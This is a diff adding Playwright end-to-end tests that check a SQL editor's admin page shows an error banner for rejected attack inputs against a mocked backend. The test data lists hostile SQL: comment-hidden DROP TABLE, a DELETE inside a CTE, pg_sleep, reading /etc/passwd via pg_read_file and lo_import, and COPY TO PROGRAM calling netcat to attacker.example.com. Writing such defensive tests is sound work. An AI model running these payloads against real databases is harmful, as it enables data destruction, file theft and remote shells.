@@ -272,3 +272,205 @@ test.describe('T-036 — PG Viewer SQL Editor', () => {
   });
 
 });
+
+// ---------------------------------------------------------------------------
+// T-037 — Attack-surface E2E tests
+// ---------------------------------------------------------------------------
+// These tests mock the backend response (same strategy as tests 4 and 5 above)
+// so they run without a live server.  Each attack SQL input causes the mocked
+// backend to return a 400 detail string; the test asserts:
+//   1. The inline error banner (data-testid="sql-error-banner") is visible.
+//   2. The banner contains the expected detail keyword.
+//   3. No native alert() dialog appeared.
+// ---------------------------------------------------------------------------
+
+/**
+ * Map of attack cases used in the parametrized test below.
+ * Format: [testName, sql, backendDetailKeyword, expectedBannerKeyword]
+ *
+ * backendDetailKeyword — the string the mocked backend puts in `detail`
+ *   (mirrors what validate_select_sql actually returns).
+ * expectedBannerKeyword — the substring we assert is visible in the banner.
+ */
+const ATTACK_CASES: Array<[string, string, string, string]> = [
+  [
+    'comment-hidden-drop',
+    '/* hidden */ DROP TABLE users',
+    'forbidden keyword: DROP',
+    'forbidden keyword',
+  ],
+  [
+    'line-comment-drop',
+    '-- DROP\nSELECT 1',
+    'forbidden keyword: DROP',
+    'forbidden keyword',
+  ],
+  [
+    'cte-headed-delete',
+    'WITH foo AS (DELETE FROM users RETURNING *) SELECT * FROM foo',
+    'forbidden keyword: DELETE',
+    'forbidden keyword',
+  ],
+  [
+    'multi-statement-semicolon',
+    'SELECT 1; SELECT 2',
+    'multiple statements are not allowed',
+    'multiple statements',
+  ],
+  [
+    'pg-sleep-dos',
+    'SELECT pg_sleep(30)',
+    'forbidden function: pg_sleep',
+    'forbidden function',
+  ],
+  [
+    'dblink-exec-oob',
+    "SELECT dblink_exec('DROP TABLE users')",
+    'forbidden function: dblink_exec',
+    'forbidden function',
+  ],
+  [
+    'lo-import-lfi',
+    "SELECT lo_import('/etc/passwd')",
+    'forbidden function: lo_import',
+    'forbidden function',
+  ],
+  [
+    'pg-read-file-lfi',
+    "SELECT pg_read_file('/etc/passwd')",
+    'forbidden function: pg_read_file',
+    'forbidden function',
+  ],
+  [
+    'copy-to-program-rce',
+    "COPY (SELECT 1) TO PROGRAM 'nc attacker.example.com 1337'",
+    'forbidden keyword: COPY',
+    'forbidden keyword',
+  ],
+  [
+    'security-label-priv',
+    "SECURITY LABEL FOR provider ON TABLE x IS 'y'",
+    'forbidden keyword: SECURITY',
+    'forbidden keyword',
+  ],
+  [
+    'unicode-cyrillic-select',
+    'ЅELECT 1',
+    'only SELECT (or WITH \u2026 SELECT) statements are allowed',
+    'only SELECT',
+  ],
+];
+
+test.describe('T-037 — Attack-surface inputs', () => {
+
+  for (const [caseName, sql, backendDetail, bannerKeyword] of ATTACK_CASES) {
+    test(`Attack: ${caseName} → inline error banner shows "${bannerKeyword}"`, async ({ page }) => {
+      await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);
+
+      // Mock backend returning 400 with the exact detail string from validate_select_sql
+      await page.route('**/api/pg-viewer/sql', (route) => {
+        route.fulfill({
+          status: 400,
+          contentType: 'application/json',
+          body: JSON.stringify({ detail: backendDetail }),
+        });
+      });
+
+      // No dialog should appear
+      let dialogAppeared = false;
+      page.on('dialog', async (dialog) => {
+        dialogAppeared = true;
+        await dialog.dismiss();
+      });
+
+      await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
+      await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });
+
+      // Type the attack SQL (fill handles newlines correctly)
+      await page.fill('textarea#sql-editor-textarea', sql);
+      await page.getByTestId('run-sql-button').click();
+
+      // Inline error banner must appear
+      await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
+      await expect(page.getByTestId('sql-error-banner')).toContainText(bannerKeyword);
+
+      // No native dialog
+      expect(dialogAppeared).toBe(false);
+    });
+  }
+
+  // ── Ctrl+Enter keybind on attack SQL also shows error banner ──────────────
+  test('Attack via Ctrl+Enter: pg_sleep → inline error banner', async ({ page }) => {
+    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);
+
+    await page.route('**/api/pg-viewer/sql', (route) => {
+      route.fulfill({
+        status: 400,
+        contentType: 'application/json',
+        body: JSON.stringify({ detail: 'forbidden function: pg_sleep' }),
+      });
+    });
+
+    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
+    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });
+
+    const textarea = page.locator('textarea#sql-editor-textarea');
+    await textarea.fill('SELECT pg_sleep(30)');
+    await textarea.press('Control+Enter');
+
+    // Error banner via keybind — same assertion as click path
+    await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
+    await expect(page.getByTestId('sql-error-banner')).toContainText('forbidden function');
+  });
+
+  // ── Error banner clears on subsequent successful run ──────────────────────
+  test('Error banner clears when subsequent query succeeds', async ({ page }) => {
+    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);
+
+    let callCount = 0;
+    await page.route('**/api/pg-viewer/sql', (route) => {
+      callCount += 1;
+      if (callCount === 1) {
+        // First call: attack → 400
+        route.fulfill({
+          status: 400,
+          contentType: 'application/json',
+          body: JSON.stringify({ detail: 'forbidden keyword: DROP' }),
+        });
+      } else {
+        // Second call: valid SELECT → 200
+        route.fulfill({
+          status: 200,
+          contentType: 'application/json',
+          body: JSON.stringify({
+            columns: [{ name: '?column?', data_type: 'integer' }],
+            rows: [{ '?column?': 1 }],
+            row_count: 1,
+            elapsed_ms: 2,
+            truncated: false,
+            notice: null,
+          }),
+        });
+      }
+    });
+
+    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
+    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });
+
+    // First run: attack → banner appears
+    await page.fill('textarea#sql-editor-textarea', 'DROP TABLE users');
+    await page.getByTestId('run-sql-button').click();
+    await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
+
+    // Second run: valid query → banner must disappear; result table appears
+    await page.fill('textarea#sql-editor-textarea', 'SELECT 1');
+    await page.getByTestId('run-sql-button').click();
+
+    // Result table must appear
+    await expect(page.getByTestId('sql-result-table')).toBeVisible({ timeout: 10000 });
+
+    // Error banner must be gone (hidden or removed from DOM)
+    await expect(page.getByTestId('sql-error-banner')).not.toBeVisible({ timeout: 5000 });
+  });
+
+});
